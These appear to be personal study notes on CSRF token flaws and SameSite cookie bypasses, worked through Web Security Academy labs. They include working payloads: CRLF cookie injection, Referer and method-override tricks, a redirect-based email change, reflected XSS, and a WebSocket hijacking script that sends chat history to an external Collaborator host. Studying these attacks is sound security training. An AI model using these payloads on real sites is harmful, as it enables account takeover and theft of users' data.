> Note
> 
> Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.

### Validation of CSRF token depends on request method
Some applications correctly validate the token when the request uses the `POST` method but skip the validation when the `GET` method is used. 

### Validation of CSRF token depends on token being present
Some applications correctly validate the token when it is present but skip the validation if the token is omitted. 

### CSRF token is not tied to the user session
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. 

### CSRF token is tied to a non-session cookie
If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.  
The attacker can log in to the application using their own account, obtain a valid csrf token and cookie that is associated with that csrf token, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

> Note: The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com could be leveraged to place a cookie that is submitted to secure.normal-website.com. 

#### Lab: (see csrfNotTiedToSession.html)
There's an update email endpoint:
```
POST /email/change HTTP/1.1
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
Body: csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

Exploiting:
- Send the request to Burp Repeater and observe that changing the session cookie logs you out, but changing the `csrfKey` cookie merely results in the `CSRF` token being rejected. This suggests that the `csrfKey` cookie may not be strictly tied to the session.
- Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
- Observe that if you swap the `csrfKey` cookie and `csrf` parameter from the first account to the second account, the request is accepted and the email in the second account is updated. 

So if we can put `csrfKey` cookie into victim's browser then we can change their email
- Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the response from the server contains: `Set-Cookie: LastSearchTerm=<whatever was put into the search input>; Secure; HttpOnly`. Since there is no check for whatever is returned as a response to Set-Cookie, the cookie will be injected into the victim user's browser. 

i.e. If can put the following into the victim's browser:
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
Then the response from the server will be changed from this:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=hoba; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3420
```
To this:
```
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test%0d%0aSet-Cookie:%20csrfKey=isbL4U9B3oBTG7MakdcPCoJsrDFyWhoj%3b%20SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3420
```
And victim will be set with the cookie that we specified

### CSRF token is duplicated in a cookie
> Note: If confused look at the previous `CSRF token is tied to a non-session cookie`

In a further variation of the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie

Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

### CSRF where Referer validation depends on header being present
Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted. 

### CSRF with broken Referer validation
If Referer header does not contain `YOUR-LAB-ID.web-security-academy.net` then the csrf token is rejected. But the validation of that `Referer` header is done via `contains()` function. 
So if we try to send: `Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net` it is accepted.

Therefore if we include in our exploit:
```
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
```
`history.pushState` changes the current suburl to whatever is specified as the third argument of func call and therefore it changes the Referer and it becomes `https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net`

> Note: Many browsers now strip the query string from the Referer header by default.
> You can override this behavior by making sure that the response from the server that contains your exploit has the `Referrer-Policy: unsafe-url` header set (note that `Referrer` is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string. 

## Bypassing SameSite cookie restrictions
`Lax` SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:
- The request uses the `GET` method.
- The request resulted from a top-level navigation by the user, such as clicking on a link.

### Bypassing SameSite Lax restrictions using GET requests
In practice, servers aren't always fussy about whether they receive a GET or POST request to a given endpoint.
We can try to change POST to GET

Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. 
For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes: 
```
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
**Other frameworks support a variety of similar parameters.** 

### SameSite Strict bypass via client-side redirect
**Always search for `window.location`, `document.location` or `location` objects in javascript files.**

Let's say there's a post new comment url and after submitting that comment we are redirected to the following url:
```
GET /post/comment/confirmation?postId=7
```
After we're redirected to this confirmation page we can see there's a setTimeout between `<script>` tags:
```
setTimeout(() => {
     const url = new URL(window.location);
     const postId = url.searchParams.get("postId");
     window.location =  'post/' + postId;
}, 3000);
```
Which redirects back to the post page based on its id. e.g.:
```
https://lab-id.web-security-academy.net/post/7
```

The most interesting here is:
```
window.location = 'post/' + postId;
```
We have an email change endpoint which originally was a POST req but we tried and it turns out it can be changed to GET and it'll update email anyway.
```
GET /my-account/change-email?email=ff%40ff.com&submit=1
```
So we can do the following: (notice: %2e%2e%2f (which is ../) after postId, this is needed because inside of setTimeout we have 'post/' + postId)
```
document.location = "https://lab-id.web-security-academy.net/post/comment/confirmation?postId=%2e%2e%2fmy-account%2fchange-email%3femail%3danna333%40ff.com%26submit%3d1"
```
And that will update the email

### Lab: SameSite Strict bypass via sibling domain
- In Burp, go to the Proxy > HTTP history tab and find the WebSocket handshake request. This should be the most recent GET /chat request.
- Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.
- In the browser, refresh the live chat page.
- In Burp, go to the Proxy > WebSockets history tab. Notice that when you refresh the page, the browser sends a `READY` message to the server. This causes the server to respond with the entire chat history.

Confirm the CSWSH vulnerability
- In Burp, go to the Collaborator tab and click Copy to clipboard. A new Collaborator payload is saved to your clipboard.
- In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept: 
```bash
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
- Store and view the exploit yourself
- In Burp, go back to the Collaborator tab and click Poll now. Observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.
- Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.
- Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.
- Notice that your session cookie was not sent with the request.
- In the response, notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests

Identify an additional vulnerability in the same "site"
- In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an Access-Control-Allow-Origin header, which reveals a sibling domain at cms-YOUR-LAB-ID.web-security-academy.net.
- In the browser, visit this new URL to discover an additional login form.
- Submit some arbitrary login credentials and observe that the username is reflected in the response in the Invalid username message.
- Try injecting an XSS payload via the username parameter, for example:
- <script>alert(1)</script>
- Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector.
- Send the POST /login request containing the XSS payload to Burp Repeater.
- In Burp Repeater, right-click on the request and select Change request method to convert the method to GET. Confirm that it still receives the same response.
- Right-click on the request again and select Copy URL. Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions.

Bypass the SameSite restrictions
- URL encode the entire script from above. 
    - Go to burp Decoder and paste the entire script from above there. (make sure to include <script>...</script> html tags)
    - Click encode as URL
- Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter. The following is one possible approach: 
```bash
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=<script>let ws = new WebSocket()...</script>&password=anything";
</script>
```
Deliver the exploit to the victim
In collaborator review the chat history and login as another user

### Bypassing SameSite Lax restrictions with newly issued cookies
Cookies with Lax SameSite restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions.

As mentioned earlier, if a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks. 

> Note: This two-minute window does not apply to cookies that were explicitly set with the SameSite=Lax attribute. 

It's somewhat impractical to try timing the attack to fall within this short window. On the other hand, if you can find a gadget on the site that enables you to force the victim to be issued a new session cookie, you can preemptively refresh their cookie before following up with the main attack. For example, completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site.

To trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.

Alternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default: 
```
window.open('https://vulnerable-website.com/login/sso')
```
To get around this, you can wrap the statement in an onclick event handler as follows: 
```bash
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```
This way, the window.open() method is only invoked when the user clicks somewhere on the page.

### Lab: SameSite Lax bypass via cookie refresh


